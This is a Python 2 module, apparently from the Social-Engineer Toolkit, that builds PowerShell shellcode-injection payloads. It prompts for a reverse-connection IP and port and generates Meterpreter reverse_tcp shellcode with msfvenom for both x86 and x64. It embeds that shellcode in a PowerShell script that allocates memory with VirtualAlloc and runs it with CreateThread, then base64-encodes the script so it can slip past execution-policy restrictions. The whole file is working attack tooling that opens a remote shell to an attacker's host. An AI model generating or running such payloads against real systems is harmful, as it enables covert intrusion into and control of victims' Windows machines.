#!/usr/bin/python
import base64,sys,subprocess,re,os,time
from src.core.setcore import *

# grab ipaddress
if os.path.isfile("src/program_junk/ipaddr.file"):
        fileopen = file("src/program_junk/ipaddr.file", "r")
        ipaddr = fileopen.read()
else: 
        ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
        filewrite = file("src/program_junk/ipaddr.file", "w")
        filewrite.write(ipaddr)

if os.path.isfile("src/program_junk/port.options"):
        fileopen = file("src/program_junk/port.options", "r")
        port = fileopen.read()

else: 
        filewrite=file("src/program_junk/port.options", "w")
        port = raw_input("Enter the port number for the reverse connection: ")
        filewrite.write(port)

# payload prep
if os.path.isfile("src/program_junk/metasploit.payload"):
        fileopen = file("src/program_junk/metasploit.payload", "r")
        payload = fileopen.read()
        if payload == "windows/meterpreter/reverse_tcp":        
                x86_payload = "windows/meterpreter/reverse_tcp"
                x64_payload = "windows/x64/meterpreter/reverse_tcp"

else: 
        x86_payload = "windows/meterpreter/reverse_tcp"
        x64_payload = "windows/x64/meterpreter/reverse_tcp"

def generate_payload(payload,ipaddr,port):
        # grab the metasploit path
        msf_path = meta_path()

        # generate payload
        proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
        data = proc.communicate()[0]
        # start to format this a bit to get it ready
        data = data.replace(";", "")
        data = data.replace(" ", "")
        data = data.replace("+", "")
        data = data.replace('"', "")
        data = data.replace("\n", "")
        data = data.replace("buf=", "")
        data = data.rstrip()
        # sub in \x for 0x
        data = re.sub("\\\\x", "0x", data)
        # base counter
        counter = 0
        # count every four characters then trigger mesh and write out data
        mesh = ""
        # ultimate string
        newdata = ""
        for line in data:
                mesh = mesh + line
                counter = counter + 1
                if counter == 4:
                        newdata = newdata + mesh + ","
                        mesh = ""
                        counter = 0

        # heres our shellcode prepped and ready to go
        shellcode = newdata[:-1]

        # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
        powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
        ##############################################################################################################################################################################
        # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
        # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
        ##############################################################################################################################################################################

        # blank command will store our fixed unicode variable
        blank_command = ""
        # loop through each character and insert null byte
        for char in powershell_command:
	        # insert the nullbyte
	        blank_command += char + "\x00"

        # assign powershell command as the new one
        powershell_command = blank_command
        # base64 encode the powershell command
        powershell_command = base64.b64encode(powershell_command)
        # return the powershell code
        return powershell_command

PrintStatus("Generating x64-based powershell injection code...")
x64 = generate_payload("windows/x64/meterpreter/reverse_tcp", ipaddr, port)
PrintStatus("Generating x86-based powershell injection code...")
x86 = generate_payload("windows/meterpreter/reverse_tcp", ipaddr, port)

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
        PrintStatus("Printing the x64 based encoded code...")
        time.sleep(3)
        print x64
        PrintStatus("Printing the x86 based encoded code...")
        time.sleep(3)
        print x86

filewrite = file("src/program_junk/x64.powershell", "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("src/program_junk/x86.powershell", "w")
filewrite.write(x86)
filewrite.close()
PrintStatus("Finished generating shellcode powershell injection attack and is encoded to bypass execution restriction policys...")
